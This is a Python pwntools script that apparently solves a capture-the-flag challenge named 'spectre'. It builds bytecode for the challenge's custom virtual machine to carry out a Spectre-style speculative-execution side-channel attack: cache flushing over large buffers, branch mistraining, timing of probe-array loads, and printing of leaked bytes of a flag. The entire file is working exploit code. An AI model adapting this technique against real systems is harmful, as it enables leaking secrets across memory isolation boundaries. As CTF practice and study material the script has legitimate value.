#!/usr/bin/env python
from pwn import *
import random

r = process(["./spectre","flag"])



def combine(a,b):
    return p8(((b&7)<<3)+(a&7))

def Epilogue():
    return p8(0)
def Cdq(reg_dst, reg_src32d):
    return p8(1)+combine(reg_dst, reg_src32d)
def Add(reg_dst, reg_src):
    return p8(2)+combine(reg_dst, reg_src)
def Sub(reg_dst, reg_src):
    return p8(3)+combine(reg_dst, reg_src)
def And(reg_dst, reg_src):
    return p8(4)+combine(reg_dst, reg_src)
def Shl(reg_dst, reg_src):
    return p8(5)+combine(reg_dst, reg_src)
def Shr(reg_dst, reg_src):
    return p8(6)+combine(reg_dst, reg_src)
def Mov(reg_dst, reg_src):
    return p8(7)+combine(reg_dst, reg_src)
def Movc(reg_dst, const32):
    return p8(8)+p8(reg_dst)+p32(const32)
def Load(reg_dst, mem_src):
    return p8(9)+combine(reg_dst, mem_src)
def Store(mem_dst, reg_src):
    return p8(10)+combine(mem_dst, reg_src)
def Builtin(reg_dst, func_num):
    return p8(11)+combine(reg_dst, func_num)
def Loop(reg, times, dest):
    return p8(12)+p8((reg&7)<<3)+p32(times)+p32(dest)


def access_8M_init(target):
    return Movc(0, target) + Movc(5, 512)

def access_8M_body(val):
    return Movc(6,val) + Store(0, 6) + Add(0, 5)

def train_init():
    return Movc(1, array2)

def train_body():
    ret = ''
    for i in range(4):
        ret += Movc(0, 0x61) + Builtin(0, 0) + Movc(2, 9) + Shl(0, 2) + Add(0, 1) + Load(5, 0)

    ret += Movc(0, 0x1019+4) + Builtin(0, 0) + Movc(2, 9) + Shl(0, 2) + Add(0, 1) + Load(5, 0)

    return ret

def test_time_init():
    return Movc(5, 0)

array2 = 0x1800000
flush_use = 0x800000

# 7 => i
# 6 => array2_addr
# 5 => time
# 4 => x
def test_time_body():
	ret = Movc(3, 0) + Movc(2,1) + Movc(1,0)
	ret += Add(1,5) + Add(3,2) + Loop(3, 166, len(code)+len(ret))
	ret += Movc(3,13) + Add(1,3) + Movc(3,255) + And(1,3) + Mov(4,1) + Movc(6,9) + Shl(1,6) + Movc(6,array2) + Add(6,1)
	ret += Builtin(1, 1) + Load(0, 6) + Builtin(0, 1) + Sub(0, 1)
	ret += Movc(3,3) + Shl(4,3) + Add(4, 7) + Store(4,0) + Movc(3,1) + Add(5,3)
	return ret


def get_loop(reg, cond, val):
    return Loop(reg, cond, val);



code = ''

code += Movc(7,0)

code += access_8M_init(array2)
code += access_8M_body(0x1) + get_loop(0, array2+0x7fff00, len(code))

code1 = code

for i in range(100):
    code += access_8M_init(flush_use)
    code += access_8M_body(i) + get_loop(0, flush_use+0xffff00, len(code))

code += Movc(6,0)
code += (train_init() + train_body()) + Movc(5,1) + Add(6,5) + Loop(6,50-1,len(code))

code += test_time_init()
code += test_time_body() + get_loop(5, 255, len(code))

code += Movc(6, 2048) + Add(7, 6) + get_loop(7, 0x800, len(code1))
code += Epilogue()

payload = p64(len(code))+code

with open("code","w") as file:
    file.write(payload)

#r.send(p64(0x1))
pause()
r.send(payload)
data = r.recvall()
for i in range(0, 0x1000, 8):
    if(u64(data[i:i+8]) < 80):
        print(chr( (i/8 ) % 256), u64(data[i:i+8]))


#print data[0x100:0x200]
r.interactive()
